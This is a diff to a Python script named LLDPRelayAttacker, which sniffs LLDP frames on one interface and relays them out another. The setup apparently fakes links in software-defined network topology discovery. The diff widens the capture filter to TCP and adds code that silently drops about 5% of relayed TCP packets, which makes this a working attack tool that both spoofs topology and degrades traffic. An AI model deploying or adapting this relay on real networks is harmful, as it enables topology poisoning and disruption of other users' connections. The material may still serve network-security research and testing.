@@ -1,16 +1,16 @@
-import time
 import pcap
+import dpkt
+import random
 from optparse import OptionParser
 
-# Notice: any modification packet in immediate node (even if only relay packets) 
-# should turn off the checksum of tx and rx.
-# Command: 
-#   ethtool -K tx off 
-#   ethtool -K rx off
-
 class LLDPRelayAttacker(object):
+    '''
+    bind_iface: the binding interface to sniff LLDP packets.
+    relay_ends: relay the LLDP to the ends through UDP sockets. 
+    '''
     def __init__(self, in_dev, out_dev, fwd_all):
         self._init_pcap(in_dev, out_dev, fwd_all)
+        self.drop_rate = 0.05
 
     def _init_pcap(self, in_dev, out_dev, fwd_all):
         
@@ -19,7 +19,7 @@ class LLDPRelayAttacker(object):
         if not int(fwd_all):
             filter_strategy = 'ether proto 0x88cc'
         else:
-            filter_strategy = 'ether proto 0x88cc or \
+            filter_strategy = 'tcp or (ether proto 0x88cc) or \
                 (not ether dst host ff:ff:ff:ff:ff:ff and \
                  not ether src host 00:00:de:ad:be:ef)'
         self.in_handler.setfilter(filter_strategy)
@@ -30,6 +30,12 @@ class LLDPRelayAttacker(object):
     # be forwarded (relayed). However, the function can be realized in other modules.    
     def _loop_capture(self, pcap_handler):
         for _, pdata in pcap_handler:
+            eth = dpkt.ethernet.Ethernet(pdata)
+            if isinstance(eth.data, dpkt.ip.IP):
+                ip = eth.data
+                if isinstance(ip.data, dpkt.tcp.TCP):
+                    if random.random() < self.drop_rate:
+                        continue # drop packet
             self.out_handler.sendpacket(pdata)
 
     def run(self):
